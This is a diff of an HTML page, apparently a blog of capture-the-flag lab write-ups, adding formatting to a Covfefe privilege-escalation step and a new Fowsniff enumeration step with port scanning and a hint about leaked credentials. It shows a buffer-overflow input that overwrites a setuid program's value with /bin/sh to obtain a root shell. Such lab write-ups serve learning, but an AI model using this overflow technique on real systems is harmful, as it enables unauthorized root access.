@@ -537,18 +537,27 @@ contain more then 20 chars and after that overwrite the program value with anoth
 
 <ol>
   <li>Privalge Escalation: running the program with the values more then 20 chars and insert /bin/sh to gain shell as root:
-simon@covfefe:~$ read_message
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>simon@covfefe:~$ read_message
 What is your name?
 Simonnnnnnnnnnnnnnnn/bin/sh
 Hello Simonnnnnnnnnnnnnnnn/bin/sh! Here is your message:
-    <h1 id="id">id</h1>
-    <p>uid=1000(simon) gid=1000(simon) euid=0(root) groups=1000(simon),24(cdrom),25(floppy
-),29(audio),30(dip),44(video),46(plugdev),108(netdev)</p>
+# id
+uid=1000(simon) gid=1000(simon) euid=0(root) groups=1000(simon),24(cdrom),25(floppy
+),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+</code></pre></div>    </div>
   </li>
 </ol>
 
 <h3 id="fowsniff">Fowsniff</h3>
 
+<ol>
+  <li>Enumeration: running full port scan with <code class="highlighter-rouge">rustscan</code> found that only 22,80,110,143 are open, so run <code class="highlighter-rouge">nmap</code> and found that none of the port look like interesting, so go against the web with <code class="highlighter-rouge">webenum</code> found nothing but on the index.html page found the following which give clue what to do next:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords.
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>This lead us to run google search for <code class="highlighter-rouge">Fowsniff</code> since it tell us that thiis system are exposure data</p>
 <h3 id="geisha">Geisha</h3>
 
 <h3 id="jisctf">JISCTF</h3>
